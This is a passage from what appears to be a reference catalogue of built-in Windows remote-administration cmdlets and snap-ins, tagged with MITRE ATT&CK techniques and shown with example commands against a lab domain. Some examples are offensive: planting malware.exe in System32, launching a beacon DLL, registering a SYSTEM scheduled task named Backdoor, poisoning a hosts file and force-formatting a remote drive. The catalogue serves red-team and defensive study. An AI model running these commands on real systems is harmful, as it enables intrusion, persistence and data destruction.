Copy-VMFile -SourcePath C:\tmp\malware.exe -Name 'Windows 10 22H2' -DestinationPath C:\Windows\System32\spoolsv64.exe -FileSource Host -CimSession $s
```

#### devmgmt.msc
Device Manager; Type: MMC Snap-in; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage
```
compmgmt.msc
```

#### DevModeRunAsUserConfig.msc
Group policy settings: Start Menu and Taskbar; Type: MMC Snap-in; Toolsets: Builtin, GUI
**Categories:** Builtin, Domain, GUI, MMC Snap-in
```
gpedit.msc
```

#### Disable-NetAdapter
Disables a network adapter; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047
```
Disable-NetAdapter -Name Ethernet0 -CimSession $s
```

#### Disable-NetFirewallRule
Disables a firewall rule; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Disable-NetFirewallRule -CimSession $s
```

#### diskmgmt.msc
Disk Management; Type: MMC Snap-in; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage
```
compmgmt.msc
```

#### Dismount-DiskImage
Dismounts a disk image (virtual hard disk or ISO) so that it can no longer be accessed as a disk; Type: Cmdlet; MITRE...
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
Dismount-DiskImage -CimSession $s
```

#### Enable-NetFirewallRule
Enables a previously disabled firewall rule; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Enable-NetFirewallRule -CimSession $s
```

#### Enter-PSSession
Starts an interactive session with a remote computer; Type: Cmdlet; MITRE ATT&CK: T1021.006; Toolsets: Builtin, PSSes...
**Categories:** Builtin, Cmdlet, Execute, PSSession, T1021.006
```
Enter-PSSession -Session $ps
```

#### eventvwr.msc
Event Viewer; Type: MMC Snap-in; MITRE ATT&CK: T1070.001, T1562.002; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, Logs, MMC Snap-in, T1070.001, T1562.002
```
eventvwr.exe DC1.ad.bitsadmin.com
```

#### Export-VM
Exports a virtual machine to disk; Type: Cmdlet; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Manage
```
Export-VM -Name 'Windows 10 22H2' -Path C:\tmp -CimSession $s
```

#### Export-VMSnapshot
Exports a virtual machine checkpoint to disk; Type: Cmdlet; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Manage, TODO
```
Export-VMSnapshot -Name 'VM snapshot' -VMName 'Windows 10 22H2' -Path C:\tmp -CimSession $s
```

#### Find-NetRoute
Finds the best local IP address and the best route to reach a remote address; Type: Cmdlet; MITRE ATT&CK: T1047; Tool...
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Find-NetRoute -CimSession $s
```

#### Format-Volume
Formats one or more existing volumes or a new volume on an existing partition; Type: Cmdlet; MITRE ATT&CK: T1047, T14...
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, T1485
```
Format-Volume -CimSession $s -DriveLetter D -Force
```

#### fsmgmt.msc
Shared Folders; Type: MMC Snap-in; MITRE ATT&CK: T1021.002, T1135; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage, T1021.002, T1135
```
fsmgmt.msc /computer:W10.ad.bitsadmin.com
```

#### Get-ChildItem
Gets the files and folders in a file system drive.; Type: Cmdlet; MITRE ATT&CK: T1083; Toolsets: Builtin
**Categories:** Builtin, Cmdlet, Data, T1083
```
Get-ChildItem -LiteralPath '\\?\UNC\FS1.ad.bitsadmin.com\IT' -Depth 25 -Force | ForEach-Object { [PSCustomObject]@{Name=$_.Name; Mode=$_.Mode; Length=$_.Length; LastWriteTime=$_.LastWriteTime.ToUniversalTime().ToString('yyyy-MM-dd HH:mm:ss'); FullName=$_.FullName.Replace('\?\UNC','') } } | Export-Csv -Encoding UTF8 -NoTypeInformation FS1_IT.csv
```

#### Get-CimAssociatedInstance
Retrieves the CIM instances that are connected to a specific CIM instance by an association; Type: Cmdlet; MITRE ATT&...
**Categories:** Builtin, CIMSession, Cmdlet, Misc, T1047, TODO
```
Get-CimAssociatedInstance -CimSession $s
```

#### Get-CimClass
Gets a list of CIM classes in a specific namespace; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession,...
**Categories:** Builtin, CIMSession, Cmdlet, Misc, T1047, TODO
```
Get-CimClass -CimSession $s
```

#### Get-CimInstance
Gets the CIM instances of a class from a CIM server; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Manage, Processes, T1047
```
Get-CimInstance -CimSession $s -ClassName Win32_Process
```

#### Get-Disk
Gets one or more disks visible to the operating system; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047
```
Get-Disk -CimSession $s
```

#### Get-DiskImage
Gets one or more disk image objects (virtual hard disk or ISO); Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin,...
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
Get-DiskImage -CimSession $s
```

#### Get-DnsClientCache
Retrieves the contents of the DNS client cache; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047
```
Get-DnsClientCache -CimSession $s
```

#### Get-EtwTraceProvider
Gets ETW trace providers; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Misc, T1047, TODO
```
Get-EtwTraceProvider -CimSession $s
```

#### Get-EtwTraceSession
Gets ETW trace sessions; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Misc, T1047, TODO
```
Get-EtwTraceSession -CimSession $s
```

#### Get-FileShare
Retrieves file share objects and their properties; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession,...
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
Get-FileShare -CimSession $s
```

#### Get-GPO
Gets one GPO or all the GPOs in a domain; Type: Cmdlet; Toolsets: Builtin, TODO
**Categories:** Builtin, Cmdlet, Domain, TODO
```
Get-GPO
```

#### Get-GPOReport
Generates a report either in XML or HTML format for a specified GPO or for all GPOs in a domain; Type: Cmdlet; Toolse...
**Categories:** Builtin, Cmdlet, Domain, RSAT, TODO
```
Get-GPOReport -All -Domain ad.bitsadmin.com -Server DC1.ad.bitsadmin.com -ReportType Html -Path "$pwd\domain.html"
```

#### Get-GPResultantSetOfPolicy
Gets and writes the RSoP information for a user, a computer, or both to a file; Type: Cmdlet; Toolsets: Builtin, TODO
**Categories:** Builtin, Cmdlet, Domain, TODO
```
Get-GPResultantSetOfPolicy
```

#### Get-GPStarterGPO
Gets one Starter GPO or all Starter GPOs in a domain; Type: Cmdlet; Toolsets: Builtin, TODO
**Categories:** Builtin, Cmdlet, Domain, TODO
```
Get-GPStarterGPO
```

#### Get-HotFix
Gets the hotfixes that are installed on local or remote computers; Type: Cmdlet; MITRE ATT&CK: TA0043; Toolsets: Builtin
**Categories:** Builtin, Cmdlet, Recon, TA0043
```
Get-HotFix -ComputerName W10.ad.bitsadmin.com
```

#### Get-MpComputerStatus
Gets the status of antimalware software on the computer; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSes...
**Categories:** Builtin, CIMSession, Cmdlet, Recon, T1047
```
Get-MpComputerStatus -CimSession $s
```

#### Get-MpPreference
Gets preferences for the Windows Defender scans and updates; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CI...
**Categories:** Builtin, CIMSession, Cmdlet, Recon, T1047
```
Get-MpPreference -CimSession $s
```

#### Get-MpThreat
Gets the history of threats detected on the computer; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSessio...
**Categories:** Builtin, CIMSession, Cmdlet, Misc, T1047, TODO
```
Get-MpThreat -CimSession $s
```

#### Get-MpThreatCatalog
Gets known threats from the definitions catalog; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Misc, T1047, TODO
```
Get-MpThreatCatalog -CimSession $s
```

#### Get-MpThreatDetection
Gets active and past malware threats that Windows Defender detected; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Bui...
**Categories:** Builtin, CIMSession, Cmdlet, Misc, T1047, TODO
```
Get-MpThreatDetection -CimSession $s
```

#### Get-NetAdapter
Gets the basic network adapter properties; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047
```
Get-NetAdapter -Name * -CimSession $s
```

#### Get-NetConnectionProfile
Gets a connection profile; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047
```
Get-NetConnectionProfile -CimSession $s
```

#### Get-NetEventSession
Gets network event sessions; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047
```
Get-NetEventSession -Name sess -CimSession $s
```

#### Get-NetFirewallRule
Retrieves firewall rules from the target computer; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession,...
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Get-NetFirewallRule -CimSession $s
```

#### Get-NetIPAddress
Gets the IP address configuration; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047
```
Get-NetIPAddress -CimSession $s | Sort InterfaceIndex | ft -Autosize InterfaceIndex, InterfaceAlias, AddressFamily, IPAddress, PrefixLength
```

#### Get-NetIPInterface
Gets an IP interface; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Get-NetIPInterface -CimSession $s
```

#### Get-NetNat
Gets NAT objects; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Get-NetNat -CimSession $s
```

#### Get-NetNatExternalAddress
Gets external addresses configured for NAT instances; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSessio...
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Get-NetNatExternalAddress -CimSession $s
```

#### Get-NetNatGlobal
Retrieves global settings for all NAT instances on a computer; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin,...
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Get-NetNatGlobal -CimSession $s
```

#### Get-NetNatSession
Gets all active NAT sessions; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Get-NetNatSession -CimSession $s
```

#### Get-NetNatStaticMapping
Gets static mappings configured on NAT instances; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Get-NetNatStaticMapping -CimSession $s
```

#### Get-NetNeighbor
Gets neighbor cache entries; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047
```
Get-NetNeighbor -CimSession $s | select InterfaceIndex,IPAddress,AddressFamily,LinkLayerAddress,State,InterfaceAlias | ft
```

#### Get-NetRoute
Gets the IP route information from the IP routing table; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSes...
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047
```
Get-NetRoute -CimSession $s
```

#### Get-NetTCPConnection
Gets TCP connections; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047
```
Get-NetTCPConnection -CimSession $s -State Listen
```

#### Get-NetUDPEndpoint
Gets current UDP endpoint statistics; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047
```
Get-NetUDPEndpoint -CimSession $s
```

#### Get-OdbcDsn
Gets ODBC DSNs; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Misc, T1047, TODO
```
Get-OdbcDsn -CimSession $s
```

#### Get-Partition
Returns a list of all partition objects visible on all disks, or optionally a filtered list using specified parameter...
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
Get-Partition -CimSession $s
```

#### Get-PhysicalDisk
Gets a list of all PhysicalDisk objects visible across any available Storage Management Providers, or optionally a fi...
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
Get-PhysicalDisk -CimSession $s
```

#### Get-Printer
Retrieves a list of printers installed on a computer; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSessio...
**Categories:** Builtin, CIMSession, Cmdlet, Misc, T1047, TODO
```
Get-Printer -CimSession $s
```

#### Get-Process
Gets the processes that are running on the local computer or a remote computer.; Type: Cmdlet; MITRE ATT&CK: T1057; T...
**Categories:** Builtin, Cmdlet, Processes, T1057
```
Get-Process -ComputerName DC1.ad.bitsadmin.com
```

#### Get-ScheduledTask
Gets the task definition object of a scheduled task that is registered on the local computer; Type: Cmdlet; MITRE ATT...
**Categories:** Builtin, CIMSession, Cmdlet, Processes, T1047, T1053.005
```
Get-ScheduledTask -CimSession $s | % { [PSCustomObject]@{State=$_.State; TaskName=$_.TaskName; TaskPath=$_.TaskPath; Actions=$($a=$_.Actions;$($a.Id,$a.WorkingDirectory,$a.Execute,$a.Arguments).Where({$_ -ne $null}) -join " "); Author=$_.Author; Description=$_.Description; SecurityDescriptor=$_.SecurityDescriptor } }
```

#### Get-ScheduledTaskInfo
Gets run-time information for a scheduled task; Type: Cmdlet; MITRE ATT&CK: T1047, T1053.005; Toolsets: Builtin, CIMS...
**Categories:** Builtin, CIMSession, Cmdlet, Processes, T1047, T1053.005
```
Get-ScheduledTaskInfo -CimSession $s -TaskName '\Microsoft\Windows\DiskCleanup\CleanupBackdoor'
```

#### Get-Service
Gets the services on a local or remote computer; Type: Cmdlet; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Processes
```
Get-Service -ComputerName W10.ad.bitsadmin.com
```

#### Get-SmbConnection
Retrieves the connections established from the SMB client to the SMB servers; Type: Cmdlet; MITRE ATT&CK: T1047; Tool...
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
Get-SmbConnection -CimSession $s
```

#### Get-SmbOpenFile
Retrieves basic information about the files that are open on behalf of the clients of the SMB server; Type: Cmdlet; M...
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
Get-SmbOpenFile -CimSession $s
```

#### Get-SmbServerConfiguration
Retrieves the SMB server configuration; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
Get-SmbServerConfiguration -CimSession $s
```

#### Get-SmbSession
Retrieves information about the SMB sessions that are currently established between the SMB server and the associated...
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
Get-SmbSession -CimSession $s
```

#### Get-SmbShare
Retrieves the SMB shares on the computer; Type: Cmdlet; MITRE ATT&CK: T1047, T1135; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, T1135, TODO
```
Get-SmbShare -CimSession $s
```

#### Get-VirtualDisk
Returns a list of VirtualDisk objects, across all storage pools, across all providers, or optionally a filtered subse...
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
Get-VirtualDisk -CimSession $s
```

#### Get-VM
Gets the virtual machines from one or more Hyper-V hosts; Type: Cmdlet; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Manage
```
Get-VM -CimSession $s
```

#### Get-Volume
Gets the specified Volume object, or all Volume objects if no filter is provided; Type: Cmdlet; MITRE ATT&CK: T1047;...
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
Get-Volume -CimSession $s
```

#### Get-VpnConnection
Retrieves the specified VPN connection profile information; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIM...
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Get-VpnConnection -CimSession $s
```

#### Get-WinEvent
Gets events from event logs and event tracing log files on local and remote computers; Type: Cmdlet; Toolsets: Builtin
**Categories:** Builtin, Cmdlet, Logs
```
Get-WinEvent -ComputerName DC1.ad.bitsadmin.com -FilterHashtable @{logname="Security";id=4768} | % { [PSCustomObject]@{TimeCreated=$_.TimeCreated; TargetUserName=$_.Properties[0].Value; TargetDomainName=$_.Properties[1].Value; TargetSid=$_.Properties[2].Value; ServiceName=$_.Properties[3].Value; ServiceSid=$_.Properties[4].Value; TicketOptions=$_.Properties[5].Value; Status=$_.Properties[6].Value; TicketEncryptionType=$_.Properties[7].Value; PreAuthType=$_.Properties[8].Value; IpAddress=$_.Properties[9].Value; IpPort=$_.Properties[10].Value; CertIssuerName=$_.Properties[11].Value; CertSerialNumber=$_.Properties[12].Value; CertThumbprint=$_.Properties[13].Value} }
```

#### Get-WSManInstance
Displays management information for a resource instance specified by a Resource URI; Type: Cmdlet; Toolsets: Builtin
**Categories:** Builtin, Cmdlet, Sessions
```
Get-WSManInstance -ConnectionURI http://W10.ad.bitsadmin.com:5985/wsman shell -Enumerate
```

#### gpedit.msc
Local Group Policy Editor; Type: MMC Snap-in; MITRE ATT&CK: T1037.003, T1484.001; Toolsets: Builtin, GUI
**Categories:** Builtin, Domain, GUI, MMC Snap-in, Manage, T1037.003, T1484.001
```
gpedit.msc /gpcomputer: DC1.ad.bitsadmin.com
```

#### Invoke-CimMethod
Invokes a method of a CIM class; Type: Cmdlet; MITRE ATT&CK: T1047, T1112; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Execute, Manage, Registry, T1047, T1112
```
Get-CimInstance -Namespace root/CIMV2/TerminalServices -ClassName Win32_TerminalServiceSetting | Invoke-CimMethod -MethodName SetAllowTSConnections -Arguments @{AllowTSConnections=1; ModifyFirewallException=1}
```

#### Invoke-Command
Runs commands on local and remote computers; Type: Cmdlet; MITRE ATT&CK: T1021.006, T1059.001; Toolsets: Builtin, PSS...
**Categories:** Builtin, Cmdlet, Execute, PSSession, T1021.006, T1059.001
```
Invoke-Command -ComputerName W10.ad.bitsadmin.com { Get-NetAdapter }
```

#### Invoke-WSManAction
Invokes an action on the object that is specified by the Resource URI and by the selectors; Type: Cmdlet; MITRE ATT&C...
**Categories:** Builtin, Cmdlet, Execute, T1047, T1059.001
```
Invoke-WSManAction -ComputerName W10.ad.bitsadmin.com -Action "Create" -ResourceURI wmicimv2/win32_process -ValueSet @{CommandLine='C:\Windows\System32\rundll32.exe "C:\tmp\App Folder\beacon.dll",Start'}
```

#### ipsecsnp.dll
IP Security Policy Management; Type: MMC Snap-in; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage
```
mmc.exe
```

#### ipsmsnap.dll
IP Security Monitor; Type: MMC Snap-in; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage
```
mmc.exe
```

#### lusrmgr.msc
Local Users and Groups; Type: MMC Snap-in; MITRE ATT&CK: T1078.003, T1136.001, T1531; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage, T1078.003, T1136.001, T1531
```
lusrmgr.msc /computer=W10.ad.bitsadmin.com
```

#### Mount-DiskImage
Mounts a previously created disk image (virtual hard disk or ISO), making it appear as a normal disk; Type: Cmdlet; M...
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
Mount-DiskImage -CimSession $s
```

#### Move-Item
Moves an item from one location to another; Type: Cmdlet; MITRE ATT&CK: T1021.002; Toolsets: Builtin, PSSession
**Categories:** Builtin, Cmdlet, Data, PSSession, T1021.002
```
Move-Item -Path \\FS01.ad.bitsadmin.com\Users\AllUsers.zip .
```

#### MSFT_DNSClientCache
Represents a record in a DNS client cache; Type: WMI Class; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Network, WMI Class
```
Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_DNSClientCache -CimSession $s
```

#### MSFT_NetFirewallRule
Represents a Windows firewall rule; Type: WMI Class; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Manage, WMI Class
```
$fwrule = Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName="Remote Desktop - Shadow (TCP-In)"' -CimSession $s
$fwrule
$fwrule | Invoke-CimMethod -MethodName Enable

```

#### New-CimInstance
Creates a CIM instance; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Manage, T1047
```
New-CimInstance -ClassName Win32_Environment -Property @{Name="testvar";VariableValue="testvalue";UserName="<SYSTEM>"} -CimSession $s
```

#### New-CimSession
Creates a CIM session; Type: Cmdlet; MITRE ATT&CK: T1021.006, T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Manage, T1021.006, T1047
```
$s = New-CimSession -ComputerName W10.ad.bitsadmin.com
```

#### New-EtwTraceSession
Creates an ETW trace session; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Misc, T1047, TODO
```
New-EtwTraceSession -CimSession $s
```

#### New-NetEventSession
Creates a network event session; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047
```
New-NetEventSession -Name sess -CimSession $s -LocalFilePath "C:\Windows\Temp\Trace.etl" -CaptureMode SaveToFile
Add-NetEventPacketCaptureProvider -SessionName sess -CimSession $s -Level 4 -CaptureType Physical
Start-NetEventSession -Name sess -CimSession $s
Get-NetEventSession -Name sess -CimSession $s

Stop-NetEventSession -Name sess -CimSession $s
Remove-NetEventSession -Name sess -CimSession $s
Move-Item \\DC1.ad.bitsadmin.com\C$\Windows\Temp\Trace.etl C:\tmp

```

#### New-NetFirewallRule
Creates a new inbound or outbound firewall rule and adds the rule to the target computer; Type: Cmdlet; MITRE ATT&CK:...
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
New-NetFirewallRule -CimSession $s
```

#### New-NetNat
Creates a NAT object; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
New-NetNat -CimSession $s
```

#### New-NetRoute
Creates a route in the IP routing table; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
New-NetRoute -CimSession $s
```

#### New-PSSession
Creates a persistent connection to a local or remote computer; Type: Cmdlet; MITRE ATT&CK: T1021.006; Toolsets: Built...
**Categories:** Builtin, Cmdlet, Execute, Manage, PSSession, T1021.006
```
$ps = New-PSSession -ComputerName W10.ad.bitsadmin.com
```

#### New-ScheduledTask
Creates a scheduled task instance; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Execute, T1047
```
$a = New-ScheduledTaskAction -Execute "C:\Tmp\backdoor.exe" -Argument '-background'
$p = New-ScheduledTaskPrincipal -UserId "NT Authority\SYSTEM"
$ss = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -AllowStartIfOnBatteries -Compatibility Win8
$d = New-ScheduledTask -CimSession $s -Action $a -Principal $p -Settings $ss
$t = Register-ScheduledTask -CimSession $s Backdoor -InputObject $d

```

#### New-SmbShare
Creates an SMB share; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
New-SmbShare -CimSession $s
```

#### New-VirtualDisk
Creates a new virtual disk in the specified storage pool; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSe...
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
New-VirtualDisk -CimSession $s
```

#### New-VirtualDiskSnapshot
Creates a new snapshot of the specified virtual disk; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSessio...
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
New-VirtualDiskSnapshot -CimSession $s
```

#### New-WSManInstance
Creates a new instance of a management resource; Type: Cmdlet; Toolsets: Builtin, TODO
**Categories:** Builtin, Cmdlet, Manage, TODO
```
New-WSManInstance
```

#### Out-File
Sends output to a file; Type: Cmdlet; Toolsets: Builtin
**Categories:** Builtin, Cmdlet, Data
```
"10.0.10.123 legit.com" | Out-File -Append \\W10.ad.bitsadmin.com\C$\Windows\System32\Drivers\etc\hosts -Encoding ascii
```

#### perfmon.msc
Performance Monitor; Type: MMC Snap-in; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage
```
perfmon.msc
```

#### printmanagement.msc
Print Management; Type: MMC Snap-in; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage
```
printmanagement.msc
```

#### Publish-DscConfiguration
Publishes a DSC configuration to a set of computers; Type: Cmdlet; Toolsets: Builtin, TODO
**Categories:** Builtin, Cmdlet, Manage, TODO
```
Publish-DscConfiguration
```

#### pubprn.vbs
Publishes a printer to the Active Directory Domain Services; Type: Script; Toolsets: Builtin, TODO
**Categories:** Builtin, Manage, Script, TODO
```
cscript pubprn.vbs
```

#### Register-CimIndicationEvent
Subscribes to indications using a filter expression or a query expression; Type: Cmdlet; MITRE ATT&CK: T1047; Toolset...
**Categories:** Builtin, CIMSession, Cmdlet, Execute, T1047, TODO
```
Register-CimIndicationEvent -CimSession $s
```

#### Register-ScheduledTask
Registers a scheduled task definition on a local computer; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMS...
**Categories:** Builtin, CIMSession, Cmdlet, Execute, T1047
```
$a = New-ScheduledTaskAction -Execute "C:\Tmp\backdoor.exe" -Argument '-background'
$p = New-ScheduledTaskPrincipal -UserId "NT Authority\SYSTEM"
$ss = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -AllowStartIfOnBatteries -Compatibility Win8
New-ScheduledTask -CimSession $s -Action $a -Principal $p -Settings $ss
$t = Register-ScheduledTask -CimSession $s Backdoor -InputObject $d

```

#### Remove-FileShare
Removes a file share; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
Remove-FileShare -CimSession $s
```

#### Remove-MpPreference
Removes exclusions or default actions; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Misc, T1047, TODO
```
Remove-MpPreference -CimSession $s
```

#### Remove-MpThreat
Removes active threats from a computer; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Misc, T1047, TODO
```
Remove-MpThreat -CimSession $s
```

#### Remove-NetEventSession
Removes a network event session; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Remove-NetEventSession -CimSession $s
```

#### Remove-NetNat
Removes NAT objects; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Remove-NetNat -CimSession $s
```

#### Remove-NetNatExternalAddress
Removes an external address from a NAT instance; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Remove-NetNatExternalAddress -CimSession $s
```

#### Remove-NetNatStaticMapping
Removes static mappings from a NAT instance; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Remove-NetNatStaticMapping -CimSession $s
```

#### Remove-SmbShare
Deletes the specified SMB shares; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
Remove-SmbShare -CimSession $s
```

#### Remove-VirtualDisk
Deletes an existing virtual disk and reclaims the used space for use by other virtual disks in the same storage pool;...
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
Remove-VirtualDisk -CimSession $s
```

